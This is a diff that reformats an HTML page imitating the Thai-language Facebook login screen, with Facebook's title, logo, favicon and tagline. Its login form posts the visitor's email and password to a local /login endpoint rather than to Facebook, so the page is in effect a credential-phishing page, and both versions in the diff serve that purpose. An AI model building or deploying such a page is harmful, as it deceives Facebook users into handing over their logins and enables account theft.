@@ -1,41 +1,187 @@
-<!doctype html>
-<meta charset=UTF-8>
+<!DOCTYPE html>
+<meta charset="UTF-8">
 <html>
-<head>
-<link href=https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css rel=stylesheet integrity=sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3 crossorigin=anonymous>
-<script src=https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js integrity=sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p crossorigin=anonymous></script>
-<title>Facebook - เข้าสู่ระบบหรือสมัครใช้งาน</title>
-<link rel=icon href=https://camo.githubusercontent.com/e8269ba0fa40f9212ade4e230ecf4e51917bcf61a46eb2332866305a7a859948/68747470733a2f2f7374617469632e78782e666263646e2e6e65742f727372632e7068702f79622f722f684c524a3147475f79304a2e69636f>
-<style>body,html{height:100%}body{background-color:#f0f2f5;color:#1c1e21}.big-ct{display:flex;justify-content:center;align-content:center;align-items:center;width:100%;height:100%}.med-ct{display:flex;justify-content:center}.r-ct{width:50%;padding-left:20px}.ic-d{padding:76px 0 16px}#logo{height:106px;margin:-28px}h2{font-family:SFProDisplay-Regular,Helvetica,Arial,sans-serif;font-weight:500;color:#1c1e21;font-size:30px;padding-right:140px}.ct{font-family:inherit;background-color:#fff;border-radius:8px;padding:1rem;width:25rem;box-shadow:0 2px 4px rgb(0 0 0 / 10%),0 8px 16px rgb(0 0 0 / 10%)}#sm{font-size:22px;font-weight:900;width:100%}a{width:100%;text-align:center;text-align:center;text-decoration:none}#a{width:100%;margin-top:16px;text-align:center}a:hover{text-decoration:underline}.line{align-items:center;border-bottom:1px solid #dadde1;display:flex;margin:20px 16px;text-align:center}.form-control{font-size:19px;padding:14px 16px;width:100%;border:1px solid #dddfe2;border-radius:6px}#newac{background-color:#42b72a;font-size:22px;font-weight:900;margin-bottom:10px;border:0}#newac:hover{background-color:#3ba126}input::-webkit-input-placeholder{color:#90949c}#bt-lb{color:#1c1e21;font-family:SFProText-Regular,Helvetica,Arial,sans-serif;margin-top:28px;text-align:center;width:auto}#mkp{color:#1c1e21;font-family:SFProText-Semibold,Helvetica,Arial,sans-serif;font-size:16px;font-weight:600}@media screen and (max-width:899px){.med-ct{display:flex;flex-direction:column;justify-content:center;padding-bottom:36px}.r-ct{display:flex;flex-direction:column;width:400px;margin-right:auto;margin-left:auto;margin-bottom:40px}h2{text-align:center;font-size:26px;width:100%;padding-right:0}#logo{width:100%;margin-right:auto;margin-left:auto;padding-right:0;padding-left:0}.ct{margin-right:auto;margin-left:auto}}</style>
-</head>
-<body>
-<div class=big-ct>
-<div class=med-ct>
-<div class=r-ct>
-<div class=ic-d>
-<img id=logo src=https://camo.githubusercontent.com/12d67ba70ee77ef8ba2658fad2977d49c3a9e0dbe8e2828512f5bf3d4726ad9a/68747470733a2f2f7374617469632e78782e666263646e2e6e65742f727372632e7068702f79382f722f64463553496433554857642e737667>
-</div>
-<h2>Facebook ช่วยคุณเชื่อมต่อและแชร์กับผู้คนมากมายรอบตัวคุณ</h2>
-</div>
-<div>
-<div class=ct>
-<form class=form-ct action=/login>
-<div class=mb-3>
-<input type=email name=email class=form-control id=exampleInputEmail1 placeholder=อีเมลหรือหมายเลขโทรศัพท์มือถือ aria-describedby=emailHelp>
-</div>
-<div class=mb-3>
-<input type=password name=password class=form-control id=exampleInputPassword1 placeholder=รหัสผ่าน>
-</div>
-<button id=sm type=submit class="btn btn-primary">เข้าสู่ระบบ</button>
-<div id=a><a href="">ลืมรหัสผ่านใช่หรือไม่</a><div></div>
-<div class=line></div>
-<a><button id=newac class="btn btn-primary">สร้างบัญชีใหม่</button></a>
-</div></form>
-</div>
-</div>
-<p id=bt-lb><a id=mkp href="https://www.facebook.com/pages/create/?ref_type=registration_form">สร้างเพจ</a> สำหรับคนดัง แบรนด์ หรือธุรกิจ</p>
-</div>
-</div>
-</body>
-<script></script>
+  <head>
+      <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
+      <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
+      <title>Facebook - เข้าสู่ระบบหรือสมัครใช้งาน</title>
+      <link rel="icon" href="https://camo.githubusercontent.com/e8269ba0fa40f9212ade4e230ecf4e51917bcf61a46eb2332866305a7a859948/68747470733a2f2f7374617469632e78782e666263646e2e6e65742f727372632e7068702f79622f722f684c524a3147475f79304a2e69636f" />
+      <style>
+          body,html{
+              height: 100%;
+          }
+          body{
+              background-color: #f0f2f5;
+              color: #1c1e21
+          }
+          .big-ct{
+              display: flex;
+              justify-content: center;
+              align-content: center;
+              align-items: center;
+              width: 100%;
+              height: 100%;
+
+          }
+          .med-ct{
+              display: flex;
+              justify-content: center;
+          }
+          .r-ct{
+              width: 50%;
+              padding-left: 20px;
+
+          }
+          .ic-d{
+              padding: 76px 0 16px;
+          }
+          #logo{
+              height: 106px;
+              margin: -28px;
+          }
+          h2{
+              font-family: SFProDisplay-Regular, Helvetica, Arial, sans-serif;
+              font-weight: 500;
+              color: #1c1e21;
+              font-size: 30px;
+              padding-right: 140px;
+          }
+          .ct{
+              font-family: inherit;
+              background-color: #ffffff ;
+              border-radius: 8px;
+              padding: 1rem;
+              width: 25rem;
+              box-shadow: 0 2px 4px rgb(0 0 0 / 10%), 0 8px 16px rgb(0 0 0 / 10%);;
+          }
+          #sm{
+              font-size: 22px;
+              font-weight: 900;
+              width: 100%;
+
+          }
+          a{
+              width: 100%;
+              text-align: center;
+              text-align: center;
+              text-decoration: none;
+          }
+          #a{
+              width: 100%; 
+              margin-top: 16px;
+              text-align: center;
+          }
+          a:hover{
+              text-decoration: underline ;
+          }
+          .line{
+              align-items: center;
+              border-bottom: 1px solid #dadde1;
+              display: flex;
+              margin: 20px 16px;
+              text-align: center;
+          }
+          .form-control{  
+              font-size: 19px;
+              padding: 14px 16px;
+              width: 100%;
+              border: 1px solid #dddfe2;
+              border-radius: 6px;
+          }
+          #newac{
+              background-color: #42b72a ;
+              font-size: 22px;
+              font-weight: 900;
+              margin-bottom: 10px;
+              border: 0px;
+          }
+          #newac:hover{
+              background-color: #3ba126 ;
+          }
+          input::-webkit-input-placeholder{
+              color: #90949c;
+          }
+          #bt-lb{
+              color: #1c1e21;
+              font-family: SFProText-Regular, Helvetica, Arial, sans-serif;
+              margin-top: 28px;
+              text-align: center;
+              width: auto;
+          }
+          #mkp{
+              color: #1c1e21;
+              font-family: SFProText-Semibold, Helvetica, Arial, sans-serif;
+              font-size: 16px;
+              font-weight: 600;
+          }
+          @media screen and (max-width:899px) {
+              .med-ct{
+                  display: flex;
+                  flex-direction: column;
+                  justify-content: center;
+
+                  padding-bottom: 36px;
+              }
+              .r-ct{
+                  display: flex;
+                  flex-direction: column;
+                  width: 400px;
+
+                  margin-right: auto;
+                  margin-left: auto;
+
+                  margin-bottom: 40px;
+              }
+              h2{
+                  text-align: center;
+                  font-size: 26px;
+                  width: 100%;
+                  padding-right: 0px;
+              }
+              #logo{
+                  width: 100%;
+                  margin-right: auto;
+                  margin-left: auto;
+                  padding-right: 0px;
+                  padding-left: 0px;
+              }
+              .ct{
+                  margin-right: auto;
+                  margin-left: auto;
+              }
+
+          }
+      </style>
+  </head>
+      <body>
+      <div class="big-ct">
+          <div class="med-ct">
+              <div class="r-ct">
+                  <div class="ic-d">
+                      <img id="logo" src="https://camo.githubusercontent.com/12d67ba70ee77ef8ba2658fad2977d49c3a9e0dbe8e2828512f5bf3d4726ad9a/68747470733a2f2f7374617469632e78782e666263646e2e6e65742f727372632e7068702f79382f722f64463553496433554857642e737667" />
+                  </div>
+                  <h2>Facebook ช่วยคุณเชื่อมต่อและแชร์กับผู้คนมากมายรอบตัวคุณ</h2>
+              </div>
+              <div>
+                  <div class="ct" >
+                      <form class="form-ct" action="/login" >
+                          <div class="mb-3">
+                              <input type="email" name="email" class="form-control" id="exampleInputEmail1" placeholder="อีเมลหรือหมายเลขโทรศัพท์มือถือ" aria-describedby="emailHelp">
+                          </div>
+                          <div class="mb-3">
+                              <input type="password" name="password" class="form-control" id="exampleInputPassword1" placeholder="รหัสผ่าน" >
+                          </div>
+
+                          <button id="sm" type="submit"  class="btn btn-primary">เข้าสู่ระบบ</button>
+                          <div id="a"><a href="">ลืมรหัสผ่านใช่หรือไม่</a><div></div>
+                          <div class="line"></div>
+                          <a><button id="newac"  class="btn btn-primary">สร้างบัญชีใหม่</button></a>
+                      </form>
+                  </div>
+              </div>
+              <p id="bt-lb"><a id="mkp" href="https://www.facebook.com/pages/create/?ref_type=registration_form">สร้างเพจ</a> สำหรับคนดัง แบรนด์ หรือธุรกิจ</p>
+          </div>
+
+      </div>
+  </body>
 </html>
